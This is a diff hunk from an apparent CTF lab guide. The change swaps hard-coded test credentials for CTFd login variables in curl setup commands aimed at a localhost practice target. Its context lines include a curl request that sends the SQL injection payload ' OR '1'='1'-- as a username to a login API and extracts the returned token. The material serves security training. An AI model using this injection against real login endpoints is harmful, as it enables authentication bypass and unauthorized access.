@@ -378,7 +378,8 @@ Burp, right-click a request → *Send to Repeater*, then edit method / headers /
 and hit *Send*) or **curl**. Set curl up once — capture the gate cookie and the
 token, then each task is a one-liner:
 ```bash
-curl -s -c ck.txt -X POST -d "username=tester" -d "password=test123" \
+CTFD_USER='your-ctfd-name'; CTFD_PASS='your-ctfd-password'          # your CTFd login
+curl -s -c ck.txt -X POST --data-urlencode "username=$CTFD_USER" --data-urlencode "password=$CTFD_PASS" \
      http://localhost:8080/_gate/login -o /dev/null                 # gate cookie
 TOK=$(curl -s -b ck.txt --data-urlencode "username=' OR '1'='1'-- " --data-urlencode "password=x" \
       http://localhost:8080/api/v1/login | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
